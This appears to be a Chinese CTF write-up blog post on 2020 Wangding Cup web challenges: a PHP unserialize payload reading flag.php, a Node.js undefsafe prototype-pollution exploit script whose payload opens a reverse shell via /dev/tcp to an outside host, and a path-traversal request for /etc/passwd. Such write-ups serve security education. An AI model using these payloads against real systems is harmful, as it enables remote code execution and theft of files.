<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="google-site-verification" content="YzoIkNCtgkWfYMQovJhcU7aeRpuXehkNNh0zBBrgobQ">
  <meta name="msvalidate.01" content="E4EE6E9D43DD4FD9A783824561BFF9EA">
  <meta name="yandex-verification" content="6ba71dc679153571">
  <meta name="baidu-site-verification" content="1MHVnbH1GX">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/themes/blue/pace-theme-minimal.min.css">
  <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"blog.jeffz.cn","root":"/","scheme":"Muse","version":"7.8.0","exturl":true,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="网鼎杯2020的Web和Misc的部分writeup">
<meta property="og:type" content="article">
<meta property="og:title" content="网鼎杯2020-Web&amp;Misc">
<meta property="og:url" content="https://blog.jeffz.cn/2020/05/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-Web-Misc/index.html">
<meta property="og:site_name" content="Jeff&#39;s Blog">
<meta property="og:description" content="网鼎杯2020的Web和Misc的部分writeup">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2020/05/27/TIP2pohaeF7cn43.png">
<meta property="og:image" content="https://i.loli.net/2020/05/27/p7sqYdTHz4XENuV.png">
<meta property="og:image" content="https://i.loli.net/2020/05/27/r81S7lWVh9Yf4IE.png">
<meta property="og:image" content="https://i.loli.net/2020/05/27/vgKcr96CTejnLYZ.png">
<meta property="og:image" content="https://i.loli.net/2020/05/27/bBOJLIitA2WF5DG.png">
<meta property="og:image" content="https://i.loli.net/2020/05/27/zYSyuLPtlsdc59p.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020042320333967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FmbXpodQ==,size_16,color_FFFFFF,t_70">
<meta property="article:published_time" content="2020-05-27T00:49:45.000Z">
<meta property="article:modified_time" content="2020-05-27T10:51:56.806Z">
<meta property="article:author" content="Jeff">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="网鼎杯">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/05/27/TIP2pohaeF7cn43.png">

<link rel="canonical" href="https://blog.jeffz.cn/2020/05/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-Web-Misc/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>网鼎杯2020-Web&Misc | Jeff's Blog</title>
  


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?189b39b025c3006eae93f92c369aa731";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Jeff's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>我</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-collect">

    <a href="/collect/" rel="section"><i class="fa fa-address-book fa-fw"></i>网站收集</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL2plZmZ6NjE1" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://blog.jeffz.cn/2020/05/27/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-Web-Misc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Jeff">
      <meta itemprop="description" content="一个菜狗的辣鸡博客。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Jeff's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          网鼎杯2020-Web&Misc
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-05-27 08:49:45 / 修改时间：18:51:56" itemprop="dateCreated datePublished" datetime="2020-05-27T08:49:45+08:00">2020-05-27</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
                </span>
            </span>

          
            <div class="post-description">网鼎杯2020的Web和Misc的部分writeup</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="青龙组"><a href="#青龙组" class="headerlink" title="青龙组"></a>青龙组</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><p>给出了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的反序列化</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;op = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="comment">// $this-&gt;process();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = <span class="string">"flag.php"</span>;</span><br><span class="line">$o = <span class="keyword">new</span> FileHandler($filename);</span><br><span class="line"><span class="keyword">echo</span>((serialize($o)));</span><br></pre></td></tr></table></figure>

<p>生成后有两种方式绕过<code>is_valid</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;%00*%00op&quot;;i:2;s:11:&quot;%00*%00filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;%00*%00content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>php版本为<code>PHP/7.4.3</code>将<code>protect</code>替换成<code>public</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>使用<code>S</code>和反斜杠<code>\</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>当时比赛的时候发现php的<code>__destruct()</code>有个特性</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvbGFuZ3VhZ2Uub29wNS5kZWNvbi5waHAjbGFuZ3VhZ2Uub29wNS5kZWNvbi5kZXN0cnVjdG9y">https://www.php.net/manual/zh/language.oop5.decon.php#language.oop5.decon.destructor<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p><strong>Note</strong>:</p>
<p>析构函数在脚本关闭时调用，此时所有的 HTTP 头信息已经发出。脚本关闭时的工作目录有可能和在 SAPI（如 apache）中时不同。</p>
</blockquote>
<p>会发生<strong>工作目录改变</strong>的情况，这种情况可以<strong>更改成员变量个数绕过</strong>，或者读取<code>/proc/self</code>里的东西得知工作目录，使用绝对路径绕过。（不知道为什么buuoj复现的时候不需要？？？</p>
<h3 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h3><p>拿到源码先看引用的库和url路由</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br></pre></td></tr></table></figure>

<p>引用了一个<code>undefsafe</code>的库，<span class="exturl" data-url="aHR0cHM6Ly9zbnlrLmlvL3Z1bG4vU05ZSy1KUy1VTkRFRlNBRkUtNTQ4OTQw">CVE-2019-10795<i class="fa fa-external-link-alt"></i></span></p>
<p>利用点：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">    undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">    undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以用于污染<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82ODZiNjFjNGE0M2Q=">原型链<i class="fa fa-external-link-alt"></i></span></p>
<p>路由：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p><code>/status</code>中发现一个<code>exec</code></p>
<p><code>commands</code>继承原型链，实现命令执行</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">url = <span class="string">"http://caaec91a-1eea-4f5f-b977-e48255a9f22f.node3.buuoj.cn/"</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    sess.get(url)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"author"</span>: <span class="string">"/bin/bash -i &gt; /dev/tcp/frps/6009 0&gt;&amp;1"</span>,</span><br><span class="line">        <span class="string">"id"</span>: <span class="string">"__proto__"</span>,</span><br><span class="line">        <span class="string">"raw"</span>: <span class="string">"/bin/bash -i &gt; /dev/tcp/frps/6009 0&gt;&amp;1"</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = sess.post(<span class="string">f"<span class="subst">&#123;url&#125;</span>edit_note"</span>, json=data).text</span><br><span class="line">    sess.get(<span class="string">f"<span class="subst">&#123;url&#125;</span>status"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行反弹shell <code>cat /flag</code> 得到flag</p>
<h3 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h3><p>随意上传一个文件发现存在任意文件读</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>编写脚本</p>
